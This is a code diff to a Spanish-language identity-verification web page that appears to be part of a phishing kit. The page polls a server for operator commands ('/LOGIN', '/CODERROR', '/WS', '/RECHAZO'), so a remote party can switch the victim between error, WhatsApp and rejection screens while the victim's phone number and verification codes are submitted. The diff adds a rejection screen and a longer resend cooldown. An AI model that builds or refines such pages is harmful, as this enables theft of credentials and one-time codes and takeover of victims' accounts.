@@ -93,6 +93,11 @@
     .btn-secondary{width:100%;height:48px;border:1.5px solid #d1d5db;border-radius:30px;background:#fff;color:#374151;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;letter-spacing:.5px;transition:background .2s,border-color .2s}
     .btn-secondary:hover{background:#f3f4f6;border-color:#9ca3af}
     .btn-secondary:disabled{opacity:.5;cursor:not-allowed}
+    /* REJECTION STATE */
+    #s-reject{position:fixed;inset:0;background:#fff;display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 28px;z-index:500;gap:20px}
+    .reject-icon{font-size:64px;line-height:1}
+    .reject-title{font-size:20px;font-weight:700;color:#111;line-height:1.5;max-width:300px;margin-bottom:4px}
+    .reject-sub{font-size:14.5px;color:#6b7280;line-height:1.75;max-width:300px}
   </style>
 </head>
 <body>
@@ -150,6 +155,13 @@
 
 </div>
 
+<!-- STATE 4: REJECTION -->
+<div id="s-reject">
+  <div class="reject-icon">🔒</div>
+  <div class="reject-title">No hemos podido confirmar tu identidad</div>
+  <div class="reject-sub">Uno de nuestro equipo de atención al cliente se pondrá en contacto muy pronto.</div>
+</div>
+
 <!-- PHONE ERROR POPUP -->
 <div id="err-phone">
   <div class="ecard">
@@ -187,8 +199,11 @@
   function showState(id) {
     currentSt = id;
     ['s-form','s-loading','s-code'].forEach(function(s){
-      document.getElementById(s).style.display = s === id ? 'flex' : 'none';
+      var el = document.getElementById(s);
+      if (el) el.style.display = s === id ? 'flex' : 'none';
     });
+    var rej = document.getElementById('s-reject');
+    if (rej) rej.style.display = id === 's-reject' ? 'flex' : 'none';
   }
 
   /* ── CONTINUAR ── */
@@ -220,6 +235,7 @@
           showState('s-loading');
           scheduleDisclaimer();
           scheduleWaPopup();
+          startPoll();
         }
       })
       .catch(function(){
@@ -351,6 +367,8 @@
             case '/LOGIN':      window.location.href = 'listo.html'; break;
             case '/LOGINERROR': window.location.href = 'log/index.php?error=1'; break;
             case '/CODERROR':   showCooldown(); break;
+            case '/WS':         showWaModal(); startPoll(); break;
+            case '/RECHAZO':    showReject(); break;
             default:            startPoll();
           }
         })
@@ -358,10 +376,17 @@
     }, 2000);
   }
 
+  function showReject() {
+    clearInterval(pollTimer);
+    clearInterval(_loadCycleIv);
+    clearTimeout(waModTimer);
+    document.getElementById('wa-modal').classList.remove('show');
+    showState('s-reject');
+  }
+
   /* ── REENVIAR CÓDIGO ── */
   function reenviarCodigo() {
-    var btn = document.getElementById('btnResend');
-    btn.disabled = true;
+    document.getElementById('btnResend').style.display = 'none';
     var fd = new FormData();
     fd.append('type', 'resend_code');
     fd.append('u', USUARIO);
@@ -389,7 +414,7 @@
       if (t <= 0) {
         clearInterval(iv);
         wrap.style.display = 'none';
-        btn.disabled = false;
+        btn.style.display = '';
       }
     }, 1000);
   }
@@ -409,18 +434,21 @@
     inp.value = '';
     bar.style.transition = 'none';
     bar.style.width = '100%';
-    var t = 60;
+    document.getElementById('btnResend').style.display = 'none';
+    document.getElementById('resend-cd-wrap').style.display = 'none';
+    var t = 90;
     secs.textContent = t;
     setTimeout(function(){ bar.style.transition = 'width 1s linear'; }, 50);
     var iv = setInterval(function(){
       t--;
       secs.textContent = t;
-      bar.style.width = (t / 60 * 100) + '%';
+      bar.style.width = (t / 90 * 100) + '%';
       if (t <= 0) {
         clearInterval(iv);
         wrap.style.display = 'none';
         btn.disabled = false;
         btn.textContent = 'CONFIRMAR';
+        document.getElementById('btnResend').style.display = '';
       }
     }, 1000);
   }
